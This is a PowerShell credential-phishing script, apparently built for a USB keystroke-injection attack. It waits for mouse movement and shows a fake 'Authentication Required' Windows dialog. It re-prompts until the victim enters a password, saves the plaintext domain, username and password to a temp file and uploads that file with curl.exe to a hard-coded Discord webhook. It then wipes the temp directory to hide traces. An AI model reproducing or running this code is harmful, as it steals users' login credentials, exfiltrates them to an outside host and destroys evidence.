# ============================================================================
# CONFIGURATION - USER MUST SET THESE
# ============================================================================
# Set these variables based on your actual services/tokens
$db = "" # Dropbox Token (Ignored if empty)
$dc = "https://discord.com/api/webhooks/1555582537982546041/GTSJgDiEC3p6LGeaveS4IxBmke3qAnGYJvljTd9j45tGxVfdjruvve_Nj_R_XwdxQipq" # Discord Hook
$env:username = "TargetUsername" # Username for Discord/System context

# ============================================================================
# FUNCTIONS
# ============================================================================

# Function to replace MessageBox.Show() calls by triggering native GUI alerts
function Show-NativeAlert {
    param(
        [string]$Title = "Alert",
        [string]$Body = "Message",
        [string]$Buttons = "OK",
        [string]$Icon = "Warning"
    )

    # Load required assemblies for native MessageBox functionality
    Add-Type -AssemblyName System.Windows.Forms

    # Use the MessageBox class from the loaded assembly
    [System.Windows.MessageBox]::Show($Body, $Title, [System.Windows.MessageBoxButtons]::OK, [System.Windows.MessageBoxImage]::Warning)
    # Note: We simplify to just 'Ok' button as per standard practice for stealth
}

function Pause-Script {
    Add-Type -AssemblyName System.Windows.Forms
    $originalPOS = [System.Windows.Forms.Cursor]::Position.X
    $o=New-Object -ComObject WScript.Shell

    while (1) {
        $pauseTime = 3
        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
            break
        }
        else {
            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
        }
    }
}

function Caps-Off {
    Add-Type -AssemblyName System.Windows.Forms
    $caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')
    if ($caps -eq $true){
        $key = New-Object -ComObject WScript.Shell
        $key.SendKeys('{CapsLock}')
    }
}

function Get-Creds {
    $cred = $null
    $form = $null

    function Test-CredentialValidity {
        param($CredentialObject)
        if (-not $CredentialObject) { return $false }
        return -not [string]::IsNullOrWhiteSpace($CredentialObject.Password)
    }

    while ($form -eq $null) {
        # 1. Attempt Host UI (Preferred)
        try {
            $cred = $host.ui.promptforcredential("Authentication Required","Please enter credentials for the target system.", [Environment]::UserDomainName+'\'+[Environment]::UserName, [Environment]::UserDomainName); 
        }
        catch {
            # 2. Fallback to Standard GUI Prompt
            Write-Host "Host.ui failed. Falling back to Get-Credential standard GUI prompt..."
            $cred = Get-Credential -UserName ([System.Security.Principal.WindowsIdentity]::GetCurrent().Name);
        }

        # 3. Validation and Alerting (Using the new native trigger)
        if (-not (Test-CredentialValidity -CredentialObject $cred)) {
            # FAILURE/EMPTY CREDENTIALS ALERTS
            $msgBody = "Credentials cannot be empty! Please try again."

            # *** CRITICAL: Use the Native Alert Trigger ***
            Show-NativeAlert -Title "AUTHENTICATION FAILURE" -Body $msgBody

            $form = $null # Force loop continuation/re-prompt
        }
        else {
            # SUCCESS PATH
            $creds = $cred.GetNetworkCredential() | Select-Object Name, Password, Domain
            return $creds
        }
    }
}

function Upload-Discord {
    [CmdletBinding()]
    param ([Parameter (Mandatory = $False)][string]$file)
    $hookurl = "$dc"

    if (-not $hookurl) {
        Write-Error "Discord Webhook URL ($dc) is not set."
        return
    }

    $Body = @{
      'username' = $env:username
      'content' = "STATUS: Script Executed successfully."
    }

    # 1. Send Text Payload (Silent notification)
    try {
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json) -ErrorAction Stop
        Write-Host "SUCCESS: Text notification sent to Discord."
    }
    catch {
        Write-Error "ERROR: Failed to send Discord text payload: $($_.Exception.Message)"
    }

    # 2. Send File Payload (If file exists)
    if (-not [string]::IsNullOrWhiteSpace($file)) {
        try {
            Write-Host "INFO: Attempting to upload file to Discord..."
            # Using curl.exe for file upload consistency
            curl.exe -F "file1=@$file" $hookurl
            Write-Host "SUCCESS: File uploaded to Discord."
        }
        catch {
            Write-Error "ERROR: Failed to upload file to Discord: $($_.Exception.Message)"
        }
    }
}

# ============================================================================
# MAIN EXECUTION BLOCK
# ============================================================================

try {
    # 1. Initial Visibility Control
    Pause-Script
    Caps-Off

    # 2. Initial Alert (Visible Pop-up)
    $msgBody = "Authentication Required. Click OK to proceed."

    # *** CRITICAL: Use the Native Alert Trigger for initial prompt ***
    Show-NativeAlert -Title "System Access" -Body $msgBody

    # 3. Credential Gathering 
    Write-Host "INFO: Initiating Credential Prompt..."
    $creds = Get-Creds

    # 4. File Preparation and Uploads
    $FileName = "$env:USERNAME-$(Get-Date -Format yyyy-MM-dd_HH-mm)_Credentials.txt"

    # --- FIX APPLIED HERE: Robust Path Construction ---
    $tempPath = Join-Path $env:TEMP $FileName

    # --- FIX APPLIED HERE: Robust File Output ---
    $creds | Out-File -FilePath $tempPath
    Write-Host "INFO: Credentials saved locally to $tempPath."

    # Execute the main action (Discord upload)
    Upload-Discord -file $tempPath

}
catch {
    # Display critical errors using the native alert system as well
    Show-NativeAlert -Title "CRITICAL FAILURE" -Body "Script encountered a fatal error: $($_.Exception.Message)"
    Write-Error "CRITICAL SCRIPT FAILURE: $($_.Exception.Message)"
}
finally {
    # Guaranteed Cleanup
    Write-Host "--- Finalizing &amp; Cleaning Up ---"
    # Cleanup temp file explicitly if it exists
    if (Test-Path $env:TEMP"\$FileName") {
        Remove-Item $env:TEMP"\$FileName" -Force
    }
    # Basic system cleanup
    rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
    Write-Host "Execution cycle complete. Script finalized."
}
